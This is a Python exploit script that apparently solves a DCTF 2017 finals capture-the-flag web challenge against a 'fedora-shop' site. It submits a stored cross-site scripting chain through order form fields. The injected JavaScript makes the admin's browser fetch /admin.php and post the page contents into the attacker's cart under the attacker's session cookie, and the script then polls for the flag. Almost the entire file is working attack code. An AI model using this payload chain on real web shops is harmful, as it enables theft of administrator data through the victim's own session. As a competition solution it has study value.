import re
from time import sleep

import requests

s = requests.session()
session = "XYZ"


def main():
    url = "https://fedora-shop.dctf-f1nals-2017.def.camp/complet.php"
    telephone_script = """
<script>
    window.onload=function(){
        eval(document.getElementsByTagName('td')[15].innerText);
    };
</script>
        """
    address_script = """
xhr = new XMLHttpRequest();
xhr.open('POST','/?action=add&code=wfedora',true);
xhr.withCredentials=true;
document.cookie='PHPSESSID=""" + session + """';
xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
xhr.send('quantity='+this.responseText);
"""
    other_script = """
xhr = new XMLHttpRequest();
xhr.open('GET','/admin.php');
xhr.onreadystatechange = function() {
    if(xhr.readyState === XMLHttpRequest.DONE){
        eval(document.getElementsByTagName('td')[14].innerText);
    }
};
xhr.send();
"""
    params = {"email": "a@b.cd",
              "telephone": "%s" % telephone_script,
              "address": address_script,
              "other": other_script,
              "ordersum": "1234",
              "tprice": "1234"}
    s.get("https://fedora-shop.dctf-f1nals-2017.def.camp/index.php?action=remove&code=wfedora",
          cookies={"PHPSESSID": session})
    sleep(2)
    r = s.post(url, data=params, cookies={"PHPSESSID": session})
    # print(r.text)
    while True:
        r = s.get("https://fedora-shop.dctf-f1nals-2017.def.camp/index.php", cookies={"PHPSESSID": session})
        result = re.findall('DCTF.*', r.text)
        if len(result) > 0:
            break
        sleep(5)
    print(result[0])


main()
